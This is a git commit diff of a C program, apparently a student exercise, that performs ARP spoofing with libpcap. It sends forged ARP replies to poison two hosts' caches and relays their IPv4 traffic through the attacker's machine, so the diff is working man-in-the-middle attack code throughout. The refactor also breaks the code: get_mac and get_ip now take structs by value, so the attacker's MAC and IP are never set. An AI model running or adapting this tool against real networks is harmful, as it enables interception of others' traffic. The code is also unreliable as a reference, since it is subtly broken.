79fb4a764f7e6af80153b3b7f69fe7797019948e
jungvely97 <jhk078@daun.net>
2018-06-07 08:19:44 -0700

    Add main.c and arp_spoof.pro

--- main.c
+++ main.c
@@ -44,12 +44,11 @@ typedef struct  {
     struct in_addr DstAdd;
 }IPH;
 
-struct ether_addr my_mac;
-struct sockaddr_in my_ip;
 
 uint8_t sendermac[6];
 uint8_t targetmac[6];
 uint8_t MyMac[6];
+uint32_t MyIp;
 
 void dump(u_char const *data, uint32_t size){
     for(int i=0; i<size; i++) {
@@ -59,7 +58,7 @@ void dump(u_char const *data, uint32_t size){
     puts("");
 }
 
-int get_mac(char *dev){
+int get_mac(char *dev, struct ether_addr my_mac){
     FILE* ptr;
     char cmd[300] = {0x0};
     char Mac[20] = {0x0};
@@ -72,7 +71,7 @@ int get_mac(char *dev){
     return 0;
 }
 
-int get_ip(char *dev){
+int get_ip(char *dev, struct sockaddr_in my_ip){
     FILE* ptr;
     char cmd[300] = {0x0};
     char ip[21] = {0,};
@@ -83,18 +82,18 @@ int get_ip(char *dev){
     inet_aton(ip+5,&my_ip.sin_addr);
 }
 
-int Brodcast_packet(ARP_packet *pub_P, uint32_t MyIp){
+int Brodcast_packet(ARP_packet *pub_P){
     int i;
 
     for(i=0; i<6; i++) pub_P ->ether.ether_dhost[i] = 0xff;
-    for(i=0; i<6; i++) pub_P ->ether.ether_shost[i] = my_mac.ether_addr_octet[i];
+    for(i=0; i<6; i++) pub_P ->ether.ether_shost[i] = MyMac[i];
     pub_P ->ether.ether_type = htons(0x0806);
     pub_P ->arp.ar_hrd = htons(0x0001);
     pub_P ->arp.ar_pro = htons(0x0800);
     pub_P ->arp.ar_hln = 0x06;
     pub_P ->arp.ar_pln = 0x04;
     pub_P ->arp.ar_op = htons(0x0001);
-    for(i=0; i<6; i++) pub_P->SenHardAdd[i] = my_mac.ether_addr_octet[i];
+    for(i=0; i<6; i++) pub_P->SenHardAdd[i] = MyMac[i];
     pub_P ->SenIP = MyIp;
     for(i=0; i<6; i++) pub_P ->TarHardAdd[i] = 0x00;
 }
@@ -102,14 +101,14 @@ int Brodcast_packet(ARP_packet *pub_P, uint32_t MyIp){
 int Attack_packet(ARP_packet *pub_P){
     int i;
 
-    for(i=0; i<6; i++) pub_P ->ether.ether_shost[i] = my_mac.ether_addr_octet[i];
+    for(i=0; i<6; i++) pub_P ->ether.ether_shost[i] =MyMac[i];
     pub_P ->ether.ether_type = htons(0x0806);
     pub_P ->arp.ar_hrd = htons(0x0001);
     pub_P ->arp.ar_pro = htons(0x0800);
     pub_P ->arp.ar_hln = 0x06;
     pub_P ->arp.ar_pln = 0x04;
     pub_P->arp.ar_op = htons(0x0002);
-    for(i=0; i<6; i++) pub_P->SenHardAdd[i] = my_mac.ether_addr_octet[i];
+    for(i=0; i<6; i++) pub_P->SenHardAdd[i] = MyMac[i];
 }
 
 void Print_packet(ARP_packet *packet){
@@ -122,67 +121,55 @@ void Print_packet(ARP_packet *packet){
     printf("\n");
 }
 
-int Send_packet_Sender(pcap_t *handle, uint32_t send_ip, uint32_t MyIp){
-    ARP_packet packet;
+int  Send_Brod_packet(pcap_t *handle, uint32_t send_ip, uint32_t tar_ip){
+    ARP_packet packet1, packet2;
 
-    Brodcast_packet(&packet, MyIp);
-    packet.TarIP = send_ip;
+    Brodcast_packet(&packet1);
+     Brodcast_packet(&packet2);
+    packet1.TarIP = send_ip;
+    packet2.TarIP = tar_ip;
 
-    if(pcap_sendpacket(handle,(u_char *)&packet,sizeof(packet)) == -1){
+    if(pcap_sendpacket(handle,(u_char *)&packet1,sizeof(packet1)) == -1){
         printf("Send packet for Brodcast sender \n");
-        Print_packet(&packet);
+        Print_packet(&packet1);
         exit(1);
     }
-}
-
-int Send_packet_Target(pcap_t *handle, uint32_t tar_ip, uint32_t MyIp){
-    ARP_packet packet;
-
-    Brodcast_packet(&packet, MyIp);
-    packet.TarIP = tar_ip;
-
-    if(pcap_sendpacket(handle,(u_char *)&packet,sizeof(packet)) == -1){
+    if(pcap_sendpacket(handle,(u_char *)&packet2,sizeof(packet2)) == -1){
         printf("Send packet for Brodcast Target \n");
-        Print_packet(&packet);
+        Print_packet(&packet2);
         exit(1);
     }
 }
 
-int Send_Attack_packet(const u_char *packet, uint32_t send_ip, uint32_t tar_ip, pcap_t *handle, uint32_t MyIp){
-    ARP_packet s_packet;
-    ARP_packet *colander = (ARP_packet *)packet;
+int Send_Attack_packet(const u_char *packet, uint32_t send_ip, uint32_t tar_ip, pcap_t *handle){
+    ARP_packet s_packet1, s_packet2;
 
-    Attack_packet(&s_packet);
+    Attack_packet(&s_packet1);
+    Attack_packet(&s_packet2);
 
-    if(colander->SenIP == send_ip){
-        for(int i =0; i<6; i++) s_packet.ether.ether_dhost[i] = sendermac[i];
-        s_packet.SenIP = tar_ip;
-        for(int i =0; i<6; i++) s_packet.TarHardAdd[i] = sendermac[i];
-        s_packet.TarIP = send_ip;
+        for(int i =0; i<6; i++) s_packet1.ether.ether_dhost[i] = sendermac[i];
+        s_packet1.SenIP = tar_ip;
+        for(int i =0; i<6; i++) s_packet1.TarHardAdd[i] = sendermac[i];
+        s_packet1.TarIP = send_ip;
 
-        if(pcap_sendpacket(handle, (u_char *)&s_packet, sizeof(s_packet)) == -1){
+        if(pcap_sendpacket(handle, (u_char *)&s_packet1, sizeof(s_packet1)) == -1){
             printf("Send Attack packet to sander\n");
-            Print_packet(&s_packet);
+            Print_packet(&s_packet1);
             exit(1);
         }
-    }
+        for(int i =0; i<6; i++) s_packet2.ether.ether_dhost[i] = targetmac[i];
+        s_packet2.SenIP = send_ip;
+        for(int i =0; i<6; i++) s_packet2.TarHardAdd[i] = targetmac[i];
+        s_packet2.TarIP = tar_ip;
 
-    if(colander->SenIP == tar_ip){
-        if((colander->TarIP == MyIp) || (colander->TarIP == send_ip)){
-            for(int i =0; i<6; i++) s_packet.ether.ether_dhost[i] = targetmac[i];
-            s_packet.SenIP = send_ip;
-            for(int i =0; i<6; i++) s_packet.TarHardAdd[i] = targetmac[i];
-            s_packet.TarIP = tar_ip;
+        if(pcap_sendpacket(handle, (u_char *)&s_packet2, sizeof(s_packet2)) == -1){
+            printf("Send Attack packet to target \n");
+            Print_packet(&s_packet2);
+            exit(1);
+         }
+}
 
-            if(pcap_sendpacket(handle, (u_char *)&s_packet, sizeof(s_packet)) == -1){
-                printf("Send Attack packet to target \n");
-                Print_packet(&s_packet);
-                exit(1);
-            }
-        }
-    }}
-
-int Get_target_mac(const u_char *packet, uint32_t send_ip, uint32_t tar_ip, uint32_t MyIp, pcap_t *handle){
+int Get_target_mac(const u_char *packet, uint32_t send_ip, uint32_t tar_ip, pcap_t *handle){
     ARP_packet *colander = (ARP_packet *)packet;
     ARP_packet s_packet;
     Attack_packet(&s_packet);
@@ -213,7 +200,7 @@ int Get_target_mac(const u_char *packet, uint32_t send_ip, uint32_t tar_ip, uint
             exit(1);
         }}}
 
-int Relay_packet(pcap_t *handle,const u_char *packet, uint32_t send_ip, uint32_t tar_ip, struct pcap_pkthdr *header, uint32_t MyIp){
+int Relay_packet(pcap_t *handle,const u_char *packet, uint32_t send_ip, uint32_t tar_ip, struct pcap_pkthdr *header){
     struct ether_header *etherh = (struct ether_header *)packet;
     IPH *iph = (IPH *)(packet + 14);
     u_char arr[header->caplen];
@@ -221,7 +208,7 @@ int Relay_packet(pcap_t *handle,const u_char *packet, uint32_t send_ip, uint32_t
 
     memcpy(&ip, &iph->DstAdd, sizeof(iph->SrcAdd));
 
-    if((memcmp(etherh->ether_shost, sendermac, 6) == 0) && (memcmp(etherh->ether_dhost, my_mac.ether_addr_octet,6) == 0)){
+    if((memcmp(etherh->ether_shost, sendermac, 6) == 0) && (memcmp(etherh->ether_dhost, MyMac,6) == 0)){
        if( ntohl(ip) != MyIp){
         for(int i =0; i<6; i++) arr[i] = targetmac[i];
         for(int i =6; i<12; i++) arr[i] = MyMac[i-6];
@@ -234,7 +221,7 @@ int Relay_packet(pcap_t *handle,const u_char *packet, uint32_t send_ip, uint32_t
             exit(1);
        }}}
 
-    if((memcmp(etherh->ether_shost, targetmac, 6) == 0) && (memcmp(etherh->ether_dhost, my_mac.ether_addr_octet,6) == 0)){
+    if((memcmp(etherh->ether_shost, targetmac, 6) == 0) && (memcmp(etherh->ether_dhost, MyMac,6) == 0)){
        if(ntohl(ip) != MyIp){
          for(int i =0; i<6; i++) arr[i] = sendermac[i];
          for(int i =6; i<12; i++)  arr[i] = MyMac[i-6];
@@ -258,12 +245,13 @@ int main(int argc,char *argv[]){
     char *dev = argv[1];
     char errorbuf[PCAP_ERRBUF_SIZE];
     const u_char *packet;
+    struct ether_addr my_mac;
+    struct sockaddr_in my_ip;
     struct sockaddr_in sender_ip;
     struct sockaddr_in target_ip;
     struct pcap_pkthdr *header;
     uint32_t send_ip;
     uint32_t tar_ip;
-    uint32_t MyIp;
     uint8_t zero[6] = {0};
 
     inet_aton(argv[2], &sender_ip.sin_addr);
@@ -277,16 +265,16 @@ int main(int argc,char *argv[]){
         exit(1);
     }
 
-    get_mac(dev);
+    get_mac(dev, my_mac);
     memcpy(&MyMac,&my_mac.ether_addr_octet,6);
 
-    if (get_ip(dev) < 0){
+    if (get_ip(dev, my_ip) < 0){
         printf("fail get ip \n");
         exit(1);
     }
-    if (get_ip(dev) > 0) memcpy(&MyIp, &my_ip.sin_addr, sizeof(my_ip.sin_addr));
-    Send_packet_Sender(handle,  send_ip, MyIp);
-    Send_packet_Target(handle,  tar_ip, MyIp);
+    if (get_ip(dev, my_ip) > 0) memcpy(&MyIp, &my_ip.sin_addr, sizeof(my_ip.sin_addr));
+
+    Send_Brod_packet(handle, send_ip, tar_ip);
 
     while (1) {
         int next = pcap_next_ex(handle, &header, &packet);
@@ -298,13 +286,12 @@ int main(int argc,char *argv[]){
         ARP_packet *pkt = (ARP_packet *)packet;
 
         if( ntohs(pkt->ether.ether_type) == 0x0806) {
-            if(ntohs(pkt->arp.ar_op) == 0x0002 && pkt->TarIP == MyIp) Get_target_mac(packet, send_ip, tar_ip, MyIp, handle);
-
+            if(ntohs(pkt->arp.ar_op) == 0x0002 && pkt->TarIP == MyIp) Get_target_mac(packet, send_ip, tar_ip, handle);
             if(ntohs(pkt->arp.ar_op) == 0x0001){
-                Send_Attack_packet(packet, send_ip, tar_ip, handle, MyIp);
-            }
-        }
-        if( ntohs(pkt->ether.ether_type) == 0x0800)  Relay_packet(handle, packet, send_ip, tar_ip, header, MyIp);
+                Send_Attack_packet(packet, send_ip, tar_ip, handle);
+            } }
+        if(memcmp(sendermac, zero, 6) == 0 || memcmp(targetmac, zero, 6) == 0) Send_Brod_packet(handle, send_ip, tar_ip);
+        if( ntohs(pkt->ether.ether_type) == 0x0800)  Relay_packet(handle, packet, send_ip, tar_ip, header);
     }
 
 }
